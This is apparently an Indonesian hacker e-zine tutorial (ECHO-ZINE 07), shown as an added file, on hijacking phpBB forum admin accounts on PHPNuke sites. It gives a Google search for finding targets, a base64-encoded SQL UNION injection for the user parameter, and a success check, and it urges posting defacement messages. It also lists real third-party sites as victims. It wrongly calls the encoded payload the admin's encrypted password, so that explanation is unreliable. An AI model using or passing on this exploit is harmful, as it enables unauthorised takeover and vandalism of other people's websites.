@@ -1,0 +1,109 @@
+
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       07
+
+Author: Andr3^81 (andr3-81@linuxmail.org) at #PontyChat
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+Menjadi Administrator Forum Website di PHPNuke 7.2.0
+
+Berjumpa lagi dengan saya Andr3^81 yg dulunya suka posting artikel tentang Hacking email mulu 
+trus di protes ama anak² bahwa saya tukang spamer sebenarnya saya bukan mau jadi spamer tetapi 
+saya hanya iseng ajah. Dari pada berlama-lama ngoceh mending langsung aja deh
+Hal yang paling pertama dan paling utama yang perlu kita siapkan adalah:
+
+1. Komputer yg terkoneksi ke internet tentunya
+2. Paman Google ( Search Engine Favorit ku )
+3. Otak dan pikiran
+4. Kreativitas
+
+Mari kita mulai.
+Setelah sekian lama saya melanglang buana di internet akhirnya saya menemukan suatu hal 
+yang menarik yang membuat saya penasaran. Trus saya coba dan ternyata berhasil sehingga saya 
+berani memposting artikel ini. Mungkin di antara teman-teman ada yang udah tau gemana caranya. 
+Okeh mari kita mulai Buka Google.com
+
+trus ketik allinurl:modules.php?name=Forums
+
+kalianz akan menemukan banyak site yang menggunakan modules.php tersebut ituh artinya situsnya 
+menggunakan PHPNuke seperti yang lagi santer-santernya di bicarakan beberapa waktu yang lalu 
+huehuaehueahuea :P
+
+lihat inih salah satu targetnya
+http://www.vocaloid-user.net/modules.php?name=Forums&file=
+
+hehehehhe kita cobain tambah script berikut 
+Forums&file=profile&mode=viewprofile&u=2
+
+jadi seperti ini situsnya
+http://www.vocaloid-user.net/modules.php?name=Forums&file=profile&mode=viewprofile&u=2
+mengapa u=2 karena dalam Sintaks SQL User admin adalah user_id=2
+
+setelah kalian inject, kalian akan mendapatkan Cookie pada halaman atas berbentuk seperti ini
+Welcome x' UNION SELECT 2,null,'pass',1,null/*:pass
+
+Jika kalian telah mendapat hal seperti ituh bisa di katakan kalian udah berhasil melihat 
+Profile sang admin Forum,setelah kalian bisa melihat profile dari sang admin coba masukan 
+script ini Forums&user=eDp4JyBVTklPTiBTRUxFQ1QgMixudWxsLCdwYXNzJywxLG51bGwvKjpwYXNz
+menjadi 
+http://www.vocaloid-user.net/modules.php?name=Forums&user=eDp4JyBVTklPTiBTRUxFQ1QgMixudWxsLCdwYXNzJywxLG51bGwvKjpwYXNz
+koq ada eDp4JyBVTklPTiBTRUxFQ1QgMixudWxsLCdwYXNzJywxLG51bGwvKjpwYXNz <-= apa ya?
+
+oke saya akan menjelaskan sedikit itu adalah encrypt dari password sang admin yang 
+di enkripsi menggunakan PHP.Dan kalian akan melihat bahwa kalian sekarang sudah menjadi 
+admin Forum, tandanya adalah adanya tanda Log Out pada atas halaman Forum seperti ini
+
+Forum FAQ   Search   Usergroups   Profile   No new messages   Log out [ admin ]
+
+tapi jika ngga berhasil kalian akan menemukan seperti ini
+Forum FAQ   Search   Usergroups   Profile   Log in to check your private messages   Log in 
+ 
+Jika kalian telah mendapatkan ada Link Log Out berarti kalian udah berhasil menjadi admin 
+Forum di website itu, tinggal kalian mau apa terserah bisa juga tambah posting seperti ini
+
+[B]hacked By Andr3^81 at #PontyChat DALnet[/B]
+[B]hacked By Andr3^81 at #PontyChat DALnet[/B]
+[B]hacked By Andr3^81 at #PontyChat DALnet[/B]
+[B]hacked By Andr3^81 at #PontyChat DALnet[/B]
+
+tanda [B] adalah kode dari PHPBB yang artinya Bold
+setelah semuanya selesai jangan lupa Log Out ya
+mungkin hanya ituh tulisan dari saya silakan kalian kembangkan sendiri
+Ini ada beberapa situs yg menjadi korban :
+
+http://www.peakoilaction.org/modules.php?name=Forums&file=viewtopic&p=89&sid=6b1361fa7c773d87eb394259d95f9464#89
+http://www.vocaloid-user.net/modules.php?name=Forums&file=viewtopic&p=1477#1477
+http://www.albini.net/modules.php?name=Forums&file=viewtopic&p=841&sid=dc54b0f611d4422e1c1b5579acbbb7ad#841
+http://www.prepressforums.com/modules.php?name=Forums&file=viewtopic&p=6700#6700
+http://www.portaljava.com/home/modules.php?name=Forums&file=viewtopic&p=26789#26789
+http://www.monster-hardware.com/modules.php?name=Forums&file=viewtopic&p=18490#18490
+http://www.acmqueue.org/modules.php?name=Forums&file=viewtopic&t=102&sid=845b8cfe7904a7fa9dc9702ec797ac00
+http://www.drishtipat.org/nuke/modules.php?name=Forums&file=viewtopic&t=162
+http://www.crosstowntraffic.net/modules.php?name=Forums&file=viewtopic&t=12&sid=365caed4a7459800664770415d37468c
+http://www.totalrekall.co.uk/modules.php?name=Forums&file=viewtopic&t=227&sid=bd6481d7fa39ac6df4a70eecb06076f8
+http://www.glug-howrah.org/modules.php?name=Forums&file=viewtopic&t=81&sid=7e7a56550dcd951bd99e5685e1cfc18a
+
+yang lainnya silakan anda cari sendiri
+
+NB: script ini hanya bekerja pada phpbb2.0.6 
+
+Greets: Jasakom, #e-c-h-o, #PontyChat #batamhacker #Malanghackerlink #hackercrew 
+        #samarindahack DALnet, dan semua anak-anak yang menyenangi Informasi ini
+
+Thanks to: Kudel BayLaw Sincan2 Sitaboyan mujie kl3z ReD_oNe OchiE CROCODILLE SeTroM 
+           bmw_ceper kamang BLacKsCreEN tr0ut [B]L4C[K]^[Z]4C[K] dh1an cangak
+	   Ristobrata m_beben co_www banezz D_H_A_N_Y the_day Bithedz cicakkejepit 
+           dewa_pojangga MinangCrew `YaYan` 
+
+Sumber: http://www.waraxe.us/?modname=sa&id=017
+
+Motto: I'm Not a Hacker Yet But Someday I believe I can make it
